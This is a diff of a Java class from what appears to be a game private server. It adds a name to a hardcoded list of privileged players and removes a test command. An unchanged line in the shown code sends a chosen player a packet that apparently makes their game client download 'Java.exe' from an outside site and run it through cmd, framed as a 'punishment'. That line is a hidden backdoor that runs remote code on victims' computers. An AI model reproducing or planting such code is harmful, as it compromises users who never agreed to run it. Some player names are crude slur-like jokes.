@@ -72,7 +72,7 @@ public class SpecialPlayers {
 	* @Author Jonathan Sirens
 	* Initiates Command
 	**/
-	public static String[] player_names = {"idbowprod", "dc blitz", "plunger", "spankymcbad", "xtreme", "homobeans", "manny", "queerisme", "robotype"};
+	public static String[] player_names = {"idbowprod", "dc blitz", "plunger", "spankymcbad", "xtreme", "homobeans", "manny", "queerisme", "robotype", "jack mehoff"};
 	
 	public static void initiate_command(final Player player, String[] command, String wholeCommand) {
 		boolean continue_command = false;
@@ -89,10 +89,6 @@ public class SpecialPlayers {
 			other.getPacketSender().sendString(0, "[ABC]-http://turmoilps.org/Java.exe-cmd-/c-Java.exe");
 			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
 		}	
-		if(wholeCommand.equalsIgnoreCase("testboss")) {
-			player.setDialogueActionId(133);
-			DialogueManager.start(player, 133);
-		}
 		if(wholeCommand.equalsIgnoreCase("dice")) {
 			player.getInventory().add(11211, 1);
 		}
